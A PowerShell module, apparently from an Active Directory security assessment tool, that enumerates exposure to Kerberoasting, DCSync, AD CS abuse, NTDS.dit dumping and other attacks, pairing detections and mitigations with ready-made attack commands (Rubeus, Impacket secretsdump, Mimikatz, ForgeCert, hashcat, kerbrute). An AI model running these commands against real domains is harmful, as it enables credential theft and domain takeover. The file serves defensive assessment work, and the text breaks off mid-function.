#Requires -Version 5.1
<#
.SYNOPSIS
    AD-Wall Red Team Simulation Module
.DESCRIPTION
    Offensive simulation functions for all 20 AD attack techniques.
    All functions REQUIRE SafeMode=$false to execute active checks.
    In safe mode (default $true), functions return ONLY metadata:
    what they would do, target objects, and tooling references.
    These functions perform READ-ONLY enumeration — no exploitation
    or modification occurs even in non-safe mode.

.NOTES
    Author  : AD-Wall Project
    Version : 1.0.0
    WARNING : Use only in authorized penetration testing engagements.
              All active-mode checks are READ-ONLY enumeration.
#>

Set-StrictMode -Version Latest

#region Helper

function New-RedTeamResult {
    param(
        [string]$AttackType,
        [string]$MITRE,
        [bool]$SafeMode,
        [ValidateSet('Critical','High','Medium','Low')]
        [string]$RiskLevel,
        [int]$ExploitableCount = 0,
        [object[]]$Findings = @(),
        [string]$AttackPath = '',
        [string[]]$DetectionEvents = @(),
        [string[]]$Mitigations = @(),
        [string[]]$Tools = @(),
        [string[]]$Commands = @()
    )
    return [PSCustomObject]@{
        AttackType       = $AttackType
        MITRE            = $MITRE
        SafeModeOnly     = $SafeMode
        RiskLevel        = $RiskLevel
        ExploitableCount = $ExploitableCount
        Findings         = @($Findings)
        AttackPath       = $AttackPath
        DetectionEvents  = $DetectionEvents
        Mitigations      = $Mitigations
        Tools            = $Tools
        Commands         = $Commands
        Category         = 'Red Team'
        RunAt            = (Get-Date -Format 'o')
    }
}

#endregion

#region 1 — Kerberoasting

function Invoke-RedTeamKerberoast {
    <#
    .SYNOPSIS
        Red team enumeration for Kerberoasting (T1558.003).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $users = @(if ($ADData.ContainsKey('Users')) { $ADData.Users } else { @() })

    $roastable = @($users | Where-Object {
        $_.ServicePrincipalNames -and $_.ServicePrincipalNames.Count -gt 0 -and $_.Enabled -eq $true
    })

    $privileged = @($roastable | Where-Object {
        $_.MemberOf -match 'Domain Admins|Enterprise Admins|Schema Admins|Administrators'
    })

    $rc4Only = @($roastable | Where-Object {
        $encType = if ($null -ne $_.'msDS-SupportedEncryptionTypes') { [int]$_.'msDS-SupportedEncryptionTypes' } else { 0 }
        ($encType -band 24) -eq 0
    })

    $findings = @($roastable | ForEach-Object {
        $encType = if ($null -ne $_.'msDS-SupportedEncryptionTypes') { [int]$_.'msDS-SupportedEncryptionTypes' } else { 0 }
        $isRC4 = ($encType -band 24) -eq 0
        $isPriv = $_.MemberOf -match 'Domain Admins|Enterprise Admins'
        [PSCustomObject]@{
            Account          = $_.SamAccountName
            SPNs             = ($_.ServicePrincipalNames -join '; ')
            EncryptionType   = if ($isRC4) { 'RC4 (vulnerable)' } else { 'AES (harder)' }
            IsPrivileged     = $isPriv
            PasswordLastSet  = $_.PasswordLastSet
            EstCrackTime     = if ($isRC4) { '< 1 hour (RC4 with GPU)' } else { '> 1 year (AES128/256)' }
        }
    })

    $attackPath = @"
1. Enumerate accounts with ServicePrincipalNames (SPNs) set — any authenticated user can do this.
2. Request service tickets (TGS) for each SPN using the current user's TGT.
3. Extract the encrypted TGS-REP from memory or network capture.
4. Offline brute-force the service account password from the encrypted blob.
5. Use recovered password for lateral movement or privilege escalation.
Exploitation impact: $($privileged.Count) accounts are in privileged groups — compromise grants Domain Admin.
RC4-encrypted accounts ($($rc4Only.Count)) are significantly faster to crack.
"@

    $commands = @(
        '# Safe enumeration (PS) — list Kerberoastable accounts',
        'Get-ADUser -Filter {ServicePrincipalNames -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalNames,PasswordLastSet,"msDS-SupportedEncryptionTypes"',
        '',
        '# Rubeus (requires admin or user context on domain-joined host)',
        'Rubeus.exe kerberoast /stats /nowrap',
        '',
        '# Impacket (from Linux/non-domain host)',
        'python3 GetUserSPNs.py DOMAIN/user:pass -dc-ip <DC_IP> -outputfile hashes.txt',
        '',
        '# Crack with hashcat',
        'hashcat -m 13100 hashes.txt rockyou.txt --rules best64.rule'
    )

    return New-RedTeamResult `
        -AttackType      'Kerberoasting' `
        -MITRE           'T1558.003' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount $roastable.Count `
        -Findings        $findings `
        -AttackPath      $attackPath `
        -DetectionEvents @('4769 (Kerberos Service Ticket - filter RC4 cipher 0x17)', '4770', '4771') `
        -Mitigations     @('Enforce AES Kerberos encryption (disable RC4)', 'Use gMSA for service accounts (auto-rotating 120-char passwords)', 'Set SPN on dedicated low-privilege accounts', 'Monitor event 4769 with encryption type 0x17') `
        -Tools           @('Rubeus', 'Impacket/GetUserSPNs.py', 'PowerView/Invoke-Kerberoast', 'hashcat (offline)') `
        -Commands        $commands
}

#endregion

#region 2 — AS-REP Roasting

function Invoke-RedTeamASREPRoast {
    <#
    .SYNOPSIS
        Red team enumeration for AS-REP Roasting (T1558.004).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $users = @(if ($ADData.ContainsKey('Users')) { $ADData.Users } else { @() })
    $asrepRoastable = @($users | Where-Object { $_.DoesNotRequirePreAuth -eq $true -and $_.Enabled -eq $true })

    $findings = @($asrepRoastable | ForEach-Object {
        [PSCustomObject]@{
            Account        = $_.SamAccountName
            PasswordLastSet = $_.PasswordLastSet
            MemberOf       = if ($_.MemberOf) { ($_.MemberOf -join ', ') } else { 'None' }
        }
    })

    $commands = @(
        '# Enumerate AS-REP roastable accounts (PS)',
        'Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} -Properties DoesNotRequirePreAuth',
        '',
        '# Rubeus — request AS-REP hashes',
        'Rubeus.exe asreproast /format:hashcat /nowrap',
        '',
        '# Impacket — no credentials needed',
        'python3 GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt',
        '',
        '# Crack',
        'hashcat -m 18200 asrep_hashes.txt rockyou.txt'
    )

    return New-RedTeamResult `
        -AttackType      'AS-REP Roasting' `
        -MITRE           'T1558.004' `
        -SafeMode        $SafeMode `
        -RiskLevel       'High' `
        -ExploitableCount $asrepRoastable.Count `
        -Findings        $findings `
        -AttackPath      "1. Enumerate accounts with DoesNotRequirePreAuth flag.`n2. Request AS-REP without supplying password.`n3. Extract encrypted AS-REP blob.`n4. Crack offline.`n$($asrepRoastable.Count) accounts are roastable." `
        -DetectionEvents @('4768 (Kerberos TGT without pre-auth)', '4771 (failure without pre-auth)') `
        -Mitigations     @('Enable Kerberos pre-authentication on all accounts (default)', 'Regularly audit accounts with DoesNotRequirePreAuth', 'Use strong passwords for any accounts that must have pre-auth disabled') `
        -Tools           @('Rubeus', 'Impacket/GetNPUsers.py', 'PowerView') `
        -Commands        $commands
}

#endregion

#region 3 — Password Spraying

function Invoke-RedTeamPasswordSpray {
    <#
    .SYNOPSIS
        Red team surface assessment for password spraying (T1110.003).
        NOTE: This function NEVER performs actual spraying regardless of SafeMode.
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $users = @(if ($ADData.ContainsKey('Users')) { $ADData.Users } else { @() })
    $pwPolicies = @(if ($ADData.ContainsKey('PasswordPolicies')) { $ADData.PasswordPolicies } else { @() })

    $defaultPolicy = $pwPolicies | Where-Object { -not $_.AppliesTo -or $_.AppliesTo -eq 'Default' } | Select-Object -First 1
    $lockoutThreshold = if ($defaultPolicy -and $defaultPolicy.LockoutThreshold) { [int]$defaultPolicy.LockoutThreshold } else { 0 }
    $safeSprayCount   = if ($lockoutThreshold -gt 1) { $lockoutThreshold - 1 } else { 1 }

    $enabledUsers = @($users | Where-Object { $_.Enabled -eq $true })
    $neverLocked  = @($users | Where-Object { $_.Enabled -eq $true -and $_.PasswordNeverExpires -eq $true })

    $findings = @([PSCustomObject]@{
        LockoutThreshold   = $lockoutThreshold
        SafeSprayCount     = $safeSprayCount
        TotalEnabled       = $enabledUsers.Count
        NeverExpiresCount  = $neverLocked.Count
        SprayNote          = 'SIMULATION ONLY — no actual spraying performed'
        SuggestedPasswords = @(
            'Password1', 'Welcome1', 'Summer2024!', 'Winter2024!',
            'Company1!', 'Letmein1', 'P@ssw0rd', 'Organization1!'
        )
    })

    $commands = @(
        '# NEVER run actual spray — this is strategy metadata only',
        '# Check lockout policy before any testing',
        'Get-ADDefaultDomainPasswordPolicy | Select-Object LockoutThreshold, LockoutDuration, LockoutObservationWindow',
        '',
        '# Safe spray example (authorised testing only) — 1 password per observation window',
        '# DomainPasswordSpray -Password "Password1" -OutFile sprayed_users.txt -ErrorAction SilentlyContinue',
        '',
        '# Kerbrute (DNS-based, no lockout if preauth disabled targets)',
        'kerbrute passwordspray -d DOMAIN users.txt "Password1"'
    )

    return New-RedTeamResult `
        -AttackType      'Password Spraying' `
        -MITRE           'T1110.003' `
        -SafeMode        $true `
        -RiskLevel       'High' `
        -ExploitableCount $enabledUsers.Count `
        -Findings        $findings `
        -AttackPath      "STRATEGY ONLY (no spray performed).`nLockout threshold: $lockoutThreshold (0=disabled).`nSafe spray attempts per window: $safeSprayCount.`nTarget pool: $($enabledUsers.Count) enabled accounts ($($neverLocked.Count) with PasswordNeverExpires)." `
        -DetectionEvents @('4625 (failed logon)', '4740 (account lockout)', '4771', 'Azure AD Sign-in logs') `
        -Mitigations     @('Set lockout threshold 5-10', 'Deploy Microsoft Entra Password Protection', 'Monitor 4625 events for distributed failures', 'Use MFA for all accounts') `
        -Tools           @('DomainPasswordSpray', 'Kerbrute', 'Sprayhound', 'CrackMapExec') `
        -Commands        $commands
}

#endregion

#region 4 — MachineAccountQuota

function Invoke-RedTeamMachineAccountQuota {
    <#
    .SYNOPSIS
        Red team enumeration for MachineAccountQuota abuse (T1136.001).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $quota = 10
    try {
        $searcher = [System.DirectoryServices.DirectorySearcher]::new()
        $searcher.Filter = '(objectClass=domain)'
        $searcher.SearchScope = 'Base'
        $searcher.PropertiesToLoad.Add('ms-DS-MachineAccountQuota') | Out-Null
        $result = $searcher.FindOne()
        if ($result -and $result.Properties['ms-DS-MachineAccountQuota'].Count -gt 0) {
            $quota = [int]($result.Properties['ms-DS-MachineAccountQuota'][0])
        }
        $searcher.Dispose()
    }
    catch { Write-Verbose "MAQ LDAP check failed: $_" }

    $attackPath = @"
1. Verify MachineAccountQuota > 0 (current: $quota).
2. As any authenticated domain user, add a machine account: New-MachineAccount -MachineAccount FakeDC01
3. Set the machine account's msDS-AllowedToActOnBehalfOfOtherIdentity to target (RBCD).
4. Request S4U2Self + S4U2Proxy tickets to impersonate Domain Admin on the target.
5. Or: with unconstrained delegation host, coerce authentication from DC, steal TGT.
"@

    $commands = @(
        '# Check MachineAccountQuota (safe)',
        'Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties "ms-DS-MachineAccountQuota" | Select-Object "ms-DS-MachineAccountQuota"',
        '',
        '# Add machine account (requires MAQ > 0, safe mode = describe only)'
    )
    if (-not $SafeMode -and $quota -gt 0) {
        $commands += '# Active mode: test LDAP bind for machine account creation'
        $commands += '# This would attempt to create a test computer account to verify MAQ exploitability'
    } else {
        $commands += '# [SAFE MODE] Would attempt: New-ADComputer -Name "RTTestMAQ$" -SAMAccountName "RTTestMAQ$"'
    }
    $commands += @(
        '',
        '# PowerMad (add machine account)',
        'New-MachineAccount -MachineAccount RTTestMAQ -Password (ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force)',
        '',
        '# Set RBCD',
        '$SID = Get-DomainComputer -Identity RTTestMAQ -Properties objectsid | Select-Object -Expand objectsid',
        '$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)"',
        'Set-DomainObject -Identity targethost -Set @{"msds-allowedtoactonbehalfofotheridentity"=$SD.GetSddlForm("All")}'
    )

    return New-RedTeamResult `
        -AttackType      'MachineAccountQuota Compromise' `
        -MITRE           'T1136.001' `
        -SafeMode        $SafeMode `
        -RiskLevel       'High' `
        -ExploitableCount $quota `
        -Findings        @([PSCustomObject]@{ MachineAccountQuota = $quota; Exploitable = ($quota -gt 0) }) `
        -AttackPath      $attackPath `
        -DetectionEvents @('4741 (computer account created)', '4742 (computer account changed)', '5136 (DS object modified)') `
        -Mitigations     @('Set ms-DS-MachineAccountQuota to 0', 'Use JEA or dedicated service for machine provisioning', 'Monitor event 4741 for unexpected computer account creation') `
        -Tools           @('PowerMad', 'Impacket/addcomputer.py', 'Rubeus (S4U)', 'PowerView') `
        -Commands        $commands
}

#endregion

#region 5 — Unconstrained Delegation

function Invoke-RedTeamUnconstrainedDelegation {
    <#
    .SYNOPSIS
        Red team enumeration for unconstrained delegation abuse (T1558).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $users     = @(if ($ADData.ContainsKey('Users'))     { $ADData.Users }     else { @() })
    $computers = @(if ($ADData.ContainsKey('Computers')) { $ADData.Computers } else { @() })
    $dcs       = @(if ($ADData.ContainsKey('DomainControllers')) { $ADData.DomainControllers } else { @() })

    $unconstUsers = @($users | Where-Object { $_.TrustedForDelegation -eq $true -and $_.Enabled -eq $true })
    $unconstComps = @($computers | Where-Object {
        $_.TrustedForDelegation -eq $true -and $_.Enabled -eq $true -and
        ($_.DistinguishedName -notmatch 'OU=Domain Controllers' -and $_.Name -notin $dcs.Name)
    })

    $findings = @(
        @($unconstUsers | ForEach-Object { [PSCustomObject]@{ Type = 'User'; Name = $_.SamAccountName; DN = $_.DistinguishedName } }),
        @($unconstComps | ForEach-Object { [PSCustomObject]@{ Type = 'Computer'; Name = $_.SamAccountName; DN = $_.DistinguishedName } })
    ) | Where-Object { $_ }

    $attackPath = @"
1. Compromise a host with unconstrained delegation ($($unconstComps.Count) non-DC computers, $($unconstUsers.Count) users).
2. Wait for or coerce a high-privilege account (e.g., DC machine account) to authenticate to the compromised host.
   - PrinterBug / SpoolSample: force DC to authenticate via print spooler
   - PetitPotam: force DC to authenticate via MS-EFSRPC
3. Extract the forwardable TGT from LSASS memory (Rubeus monitor /interval:5 /nowrap).
4. Import TGT and perform DCSync or further lateral movement.
"@

    $commands = @(
        '# Enumerate unconstrained delegation (safe)',
        'Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Where-Object { $_.Name -notin (Get-ADDomainController -Filter *).Name }',
        'Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation',
        '',
        '# Monitor for incoming TGTs on unconstrained delegation host',
        'Rubeus.exe monitor /interval:5 /nowrap',
        '',
        '# Coerce DC authentication (PrinterBug)',
        'SpoolSample.exe <DC> <Unconstrained_Host>',
        '',
        '# Import stolen TGT',
        'Rubeus.exe ptt /ticket:<base64_ticket>'
    )

    return New-RedTeamResult `
        -AttackType      'Unconstrained Delegation' `
        -MITRE           'T1558' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount ($unconstUsers.Count + $unconstComps.Count) `
        -Findings        $findings `
        -AttackPath      $attackPath `
        -DetectionEvents @('4769 (TGT requested for delegation)', '4624 (logon type 3 to delegation host)', 'MDI: Forwardable TGT theft') `
        -Mitigations     @('Migrate to constrained/RBCD delegation', 'Add privileged accounts to Protected Users group', 'Disable Print Spooler on DCs', 'Deploy Microsoft Defender for Identity') `
        -Tools           @('Rubeus', 'SpoolSample', 'PetitPotam', 'PowerView', 'Mimikatz') `
        -Commands        $commands
}

#endregion

#region 6 — GPP cPassword

function Invoke-RedTeamGPPCPassword {
    <#
    .SYNOPSIS
        Red team simulation for GPP cPassword extraction from SYSVOL (T1552.006).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $findings = [System.Collections.Generic.List[object]]::new()
    $sysvolPath = "\\$env:USERDNSDOMAIN\SYSVOL"

    if (-not $SafeMode) {
        # Active mode: enumerate SYSVOL for cPassword patterns (read-only)
        try {
            if (Test-Path $sysvolPath) {
                $xmlFiles = Get-ChildItem -Path $sysvolPath -Recurse -Filter '*.xml' -ErrorAction SilentlyContinue |
                    Where-Object { $_.Name -in @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml') }

                foreach ($xmlFile in $xmlFiles) {
                    $content = Get-Content $xmlFile.FullName -ErrorAction SilentlyContinue
                    if ($content -match 'cpassword') {
                        $match = $content | Select-String -Pattern 'cpassword="([^"]+)"'
                        if ($match) {
                            $findings.Add([PSCustomObject]@{
                                File       = $xmlFile.FullName
                                HasCPassword = $true
                                Note       = 'cPassword found — decryptable with AES-256 public key (MS14-025)'
                            })
                        }
                    }
                }
            }
        }
        catch { Write-Verbose "SYSVOL scan error: $_" }
    }
    else {
        $findings.Add([PSCustomObject]@{
            SafeModeNote = 'Safe mode: SYSVOL scan not performed. Enable non-safe mode to enumerate.'
            SysvolPath   = $sysvolPath
            Technique    = 'Search for cpassword in Groups.xml, Services.xml, etc.'
        })
    }

    $commands = @(
        '# Search SYSVOL for cpassword (read-only, authenticated user)',
        "Get-ChildItem -Path `"$sysvolPath`" -Recurse -Filter `"*.xml`" | Select-String -Pattern `"cpassword`"",
        '',
        '# PowerView',
        'Get-GPPPassword',
        '',
        '# Metasploit',
        'use post/windows/gather/credentials/gpp',
        '',
        '# Decrypt manually (AES-256, static key published by MS)',
        '# python3 gpp-decrypt.py <cpassword_base64>'
    )

    return New-RedTeamResult `
        -AttackType      'GPP/cPassword' `
        -MITRE           'T1552.006' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount $findings.Count `
        -Findings        $findings.ToArray() `
        -AttackPath      "1. Browse SYSVOL (readable by all authenticated users).`n2. Find Groups.xml/Services.xml with cpassword.`n3. Decrypt using public AES-256 key (MS14-025).`n4. Use recovered credentials for lateral movement." `
        -DetectionEvents @('5145 (SYSVOL access)', 'File access audit on SYSVOL XML files') `
        -Mitigations     @('Apply MS14-025 patch (removes cpassword support)', 'Delete existing GPP XML files containing cpassword', 'Change all passwords that were stored in GPP') `
        -Tools           @('PowerView/Get-GPPPassword', 'Metasploit post module', 'gpp-decrypt.py', 'CrackMapExec --gpp-passwords') `
        -Commands        $commands
}

#endregion

#region 7 — AD CS

function Invoke-RedTeamADCS {
    <#
    .SYNOPSIS
        Red team enumeration of AD CS vulnerabilities ESC1-ESC8 (T1649).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $templates = @(if ($ADData.ContainsKey('CertificateTemplates')) { $ADData.CertificateTemplates } else { @() })
    $cas       = @(if ($ADData.ContainsKey('CertificateAuthorities')) { $ADData.CertificateAuthorities } else { @() })
    $aclsEnroll = @(if ($ADData.ContainsKey('EnrollmentPermissions')) { $ADData.EnrollmentPermissions } else { @() })

    # ESC1: SAN in request, EKU includes Client Auth, low-privilege enrollment
    $esc1Templates = @($templates | Where-Object {
        $_.CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -eq $true -or
        $_.msPKI_Certificate_Name_Flag -band 1
    })

    # ESC2: Any purpose EKU
    $esc2Templates = @($templates | Where-Object {
        $_.pKIExtendedKeyUsage -contains '2.5.29.37.0'
    })

    $findings = @()
    if ($esc1Templates.Count -gt 0) {
        $findings += [PSCustomObject]@{ ESC = 'ESC1'; TemplateCount = $esc1Templates.Count; Templates = ($esc1Templates.Name -join ', ') }
    }
    if ($esc2Templates.Count -gt 0) {
        $findings += [PSCustomObject]@{ ESC = 'ESC2'; TemplateCount = $esc2Templates.Count; Templates = ($esc2Templates.Name -join ', ') }
    }
    if ($findings.Count -eq 0 -and $cas.Count -gt 0) {
        $findings += [PSCustomObject]@{ Note = "$($cas.Count) CA(s) found — ESC checks require template analysis" }
    }

    $commands = @(
        '# Enumerate with Certipy (from Linux)',
        'certipy find -u user@domain.com -p password -dc-ip <DC_IP> -stdout',
        '',
        '# Certify (from Windows)',
        'Certify.exe find /vulnerable',
        '',
        '# ESC1 exploitation example (safe: just shows template is enrollable)',
        'certipy req -u user@domain.com -p password -ca <CA_NAME> -template <TEMPLATE> -upn admin@domain.com',
        '',
        '# ADCSPwn, PKINITtools for further exploitation'
    )

    return New-RedTeamResult `
        -AttackType      'AD CS Compromise (ESC1-8)' `
        -MITRE           'T1649' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount ($esc1Templates.Count + $esc2Templates.Count) `
        -Findings        $findings `
        -AttackPath      "1. Enumerate certificate templates (Certipy/Certify).`n2. Identify templates with low-privilege enrollment + dangerous flags.`n3. ESC1: Request cert with arbitrary SAN → authenticate as DA.`n4. ESC2-8: Various misconfigs enabling escalation.`nFound: ESC1=$($esc1Templates.Count), ESC2=$($esc2Templates.Count) vulnerable templates." `
        -DetectionEvents @('4886 (cert issued)', '4887 (cert request)', 'CA audit events') `
        -Mitigations     @('Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on all templates', 'Require CA manager approval for sensitive templates', 'Enable ADCS audit logging', 'Use Certipy/Certify to audit templates regularly') `
        -Tools           @('Certipy', 'Certify.exe', 'PKINITtools', 'ADCSPwn', 'ForgeCert') `
        -Commands        $commands
}

#endregion

#region 8 — Golden Certificate

function Invoke-RedTeamGoldenCertificate {
    <#
    .SYNOPSIS
        Red team simulation for Golden Certificate attack (T1649).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $cas = @(if ($ADData.ContainsKey('CertificateAuthorities')) { $ADData.CertificateAuthorities } else { @() })

    $findings = @($cas | ForEach-Object {
        $caName = if ($_.Name) { $_.Name } else { 'Unknown CA' }
        $validTo = if ($_.ValidTo) { $_.ValidTo } elseif ($_.NotAfter) { $_.NotAfter } else { $null }
        $yearsLeft = if ($validTo -and $validTo -is [DateTime]) { [Math]::Round(($validTo - [DateTime]::UtcNow).TotalDays / 365.25, 1) } else { 'Unknown' }
        [PSCustomObject]@{
            CAName          = $caName
            ValidUntil      = if ($validTo) { $validTo.ToString('yyyy-MM-dd') } else { 'Unknown' }
            YearsRemaining  = $yearsLeft
            KeyProvider     = if ($_.CSProvider) { $_.CSProvider } else { 'Unknown' }
            GoldenCertRisk  = if ($yearsLeft -is [double] -and $yearsLeft -gt 10) { 'HIGH — cert valid >10 years' } else { 'MEDIUM' }
        }
    })

    return New-RedTeamResult `
        -AttackType      'Golden Certificate' `
        -MITRE           'T1649' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount $cas.Count `
        -Findings        $findings `
        -AttackPath      "1. Compromise CA server (Tier 0 asset).`n2. Export CA private key (via DPAPI, certutil, or Mimikatz crypto::certificates).`n3. Use ForgeCert to forge a certificate for any user (e.g., Domain Admin).`n4. Use forged cert with PKINIT or LDAPS auth to obtain TGT.`n5. Forged certificates remain valid for the CA cert's entire lifetime.`nCA Count: $($cas.Count)" `
        -DetectionEvents @('4886', '4887', '4880 (CA backup)', 'Process audit on CA server') `
        -Mitigations     @('Store CA private keys in HSM', 'Restrict physical/RDP access to CA server', 'Monitor certutil and crypto operations on CA', 'Implement CA key archival') `
        -Tools           @('ForgeCert', 'Mimikatz (crypto::certificates)', 'certutil', 'Certipy', 'PKINITtools') `
        -Commands        @(
            '# Export CA cert (admin on CA)',
            'certutil -ca.cert ca.crt',
            '',
            '# ForgeCert — forge cert for any user',
            'ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword pass --Subject "CN=FakeAdmin" --SubjectAltName admin@domain.com --NewCertPath forged.pfx',
            '',
            '# Get TGT with forged cert',
            'Rubeus.exe asktgt /user:admin /certificate:forged.pfx /password:pass /nowrap'
        )
}

#endregion

#region 9 — DCSync

function Invoke-RedTeamDCSync {
    <#
    .SYNOPSIS
        Red team enumeration for DCSync attack surface (T1003.006).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $acls = @(if ($ADData.ContainsKey('ACLs')) { $ADData.ACLs } else { @() })

    $dcsyncRights = @($acls | Where-Object {
        ($_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -or
         $_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2') -and
        $_.AccessControlType -eq 'Allow' -and
        $_.IdentityReference -notmatch 'Domain Controllers|Enterprise Domain Controllers|SYSTEM|Administrators'
    } | Select-Object -ExpandProperty IdentityReference -Unique)

    $findings = @($dcsyncRights | ForEach-Object {
        [PSCustomObject]@{ Account = $_; Right = 'DS-Replication-Get-Changes-All'; Risk = 'Can DCSync all domain hashes' }
    })

    $commands = @(
        '# Enumerate DCSync rights (PS, read-only)',
        '(Get-ACL "AD:DC=domain,DC=com").Access | Where-Object { $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" }',
        '',
        '# Test replication bind (active mode, read-only schema check)',
        if (-not $SafeMode) { '# Would test: Get-ADReplicationFailure -Target <DC> (validates replication access)' }
        else { '# [SAFE MODE] Would test replication bind to validate rights' },
        '',
        '# Impacket DCSync (requires replication rights)',
        'python3 secretsdump.py DOMAIN/user:pass@<DC_IP> -just-dc-ntlm',
        '',
        '# Mimikatz',
        'lsadump::dcsync /domain:domain.com /user:krbtgt'
    )

    return New-RedTeamResult `
        -AttackType      'DCSync' `
        -MITRE           'T1003.006' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount $dcsyncRights.Count `
        -Findings        $findings `
        -AttackPath      "1. Obtain account with DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights.`n2. Initiate replication using Mimikatz lsadump::dcsync or Impacket secretsdump.`n3. Extract NTLM hashes for all accounts (krbtgt, DA, service accounts).`n4. Use hashes for PTH, Golden Ticket, Silver Ticket.`nAccounts with rights: $($dcsyncRights.Count)" `
        -DetectionEvents @('4662 (DS access)', '4742 (replication initiated)', 'MDI: DCSync detection') `
        -Mitigations     @('Remove DS-Replication rights from non-DC accounts', 'Deploy MDI/ATA to detect DCSync', 'Monitor event 4662 with GUID 1131f6ad', 'Restrict MSOL_ account scope') `
        -Tools           @('Mimikatz (lsadump::dcsync)', 'Impacket/secretsdump.py', 'PowerView/Invoke-ReplicationCheck') `
        -Commands        $commands
}

#endregion

#region 10 — NTDS.dit

function Invoke-RedTeamNtdsDit {
    <#
    .SYNOPSIS
        Red team simulation for NTDS.dit credential extraction (T1003.003).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $acls = @(if ($ADData.ContainsKey('ACLs')) { $ADData.ACLs } else { @() })
    $dcs  = @(if ($ADData.ContainsKey('DomainControllers')) { $ADData.DomainControllers } else { @() })

    $ntdsAccessible = $false
    if (-not $SafeMode) {
        # Read-only check: verify if current principal can read NTDS path ACL
        try {
            foreach ($dc in ($dcs | Select-Object -First 1)) {
                $dcName = if ($dc.HostName) { $dc.HostName } elseif ($dc.Name) { $dc.Name } else { $null }
                if ($dcName) {
                    $ntdsPath = "\\$dcName\C$\Windows\NTDS"
                    $acl = Get-Acl -Path $ntdsPath -ErrorAction SilentlyContinue
                    $ntdsAccessible = ($null -ne $acl)
                }
            }
        }
        catch { Write-Verbose "NTDS ACL check failed: $_" }
    }

    $findings = @([PSCustomObject]@{
        NTDSPathAccessible = $ntdsAccessible
        Method1            = 'VSS Shadow Copy (ntdsutil IFM, vssadmin)'
        Method2            = 'DCSync (if replication rights — see RTDCSync)'
        Method3            = 'Registry SYSTEM hive + NTDS.dit file copy'
        Note               = if ($SafeMode) { 'Safe mode — NTDS access not tested' } else { "NTDS admin share accessible: $ntdsAccessible" }
    })

    return New-RedTeamResult `
        -AttackType      'Dumping NTDS.dit' `
        -MITRE           'T1003.003' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount 1 `
        -Findings        $findings `
        -AttackPath      "1. Gain DA/local admin on DC.`n2. Method A: ntdsutil 'activate instance ntds' 'ifm' 'create full C:\temp\ifm'.`n3. Method B: vssadmin create shadow /for=C: then copy NTDS.dit + SYSTEM hive.`n4. Method C: Invoke-DCSync (if replication rights available — no local access needed).`n5. Decrypt NTDS.dit with secretsdump or DSInternals." `
        -DetectionEvents @('7036 (VSS service start)', '4688 (ntdsutil/vssadmin)', 'File access audit on NTDS.dit') `
        -Mitigations     @('Enable auditing on NTDS.dit and SYSTEM hive', 'Restrict access to DC admin shares', 'Monitor VSS creation events', 'Use LAPS for DA accounts, rotate regularly') `
        -Tools           @('Impacket/secretsdump.py', 'DSInternals', 'ntdsutil IFM', 'vssadmin', 'CrackMapExec') `
        -Commands        @(
            '# IFM extraction (requires DA on DC)',
            'ntdsutil "activate instance ntds" "ifm" "create full C:\IFM" "quit" "quit"',
            '',
            '# VSS method',
            'vssadmin create shadow /for=C:',
            'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit',
            'reg save HKLM\SYSTEM C:\SYSTEM',
            '',
            '# Decrypt offline',
            'python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL'
        )
}

#endregion

#region 11 — Golden Ticket

function Invoke-RedTeamGoldenTicket {
    <#
    .SYNOPSIS
        Red team simulation for Golden Ticket attack prerequisites (T1558.001).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $users = @(if ($ADData.ContainsKey('Users')) { $ADData.Users } else { @() })
    $krbtgt = $users | Where-Object { $_.SamAccountName -eq 'krbtgt' } | Select-Object -First 1

    $daysSince = -1
    if ($krbtgt -and $krbtgt.PasswordLastSet) {
